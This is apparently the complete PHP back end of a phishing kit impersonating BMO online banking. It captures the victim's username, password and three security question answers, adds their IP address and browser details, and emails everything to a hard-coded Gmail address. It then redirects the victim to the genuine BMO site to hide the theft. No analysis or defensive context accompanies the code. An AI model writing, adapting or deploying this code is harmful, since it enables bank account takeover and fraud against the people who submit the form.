<?php


$user = $_POST['user'];
$pass = $_POST['pass'];





$q1 = $_POST['q1'];
$a1 = $_POST['a1'];

$q2 = $_POST['q2'];
$a2 = $_POST['a2'];

$q3 = $_POST['q3'];
$a3 = $_POST['a3'];




if (getenv(HTTP_CLIENT_IP)){
	$ip=getenv(HTTP_CLIENT_IP);}
else {
	$ip=getenv(REMOTE_ADDR);}
$hostname = gethostbyaddr($_SERVER['REMOTE_ADDR']);
$browser = $_SERVER['HTTP_USER_AGENT'];
$data = "---------------------BMO---------------------
User: $user
Pass: $pass
-
Q1: $q1
A1: $a1
Q2: $q2
A2: $a2
Q3: $q3
A3: $a3
-
IP: $ip,$browser
---------------------BMO---------------------
";

$mailone = "abdoalarg53@gmail.com";






$subj = "BMO $pass $user";
 if ($user == "" ) {
  echo "<meta http-equiv='refresh' content='0;url=index.php'>";
  die();
}


@mail($mailone,$subj,$data);
@mail($cc,$subj,$data);



?>
	  <meta http-equiv="refresh" content="1;url=https://www1.bmo.com/onlinebanking/cgi-bin/netbnx/NBmain?product=5">
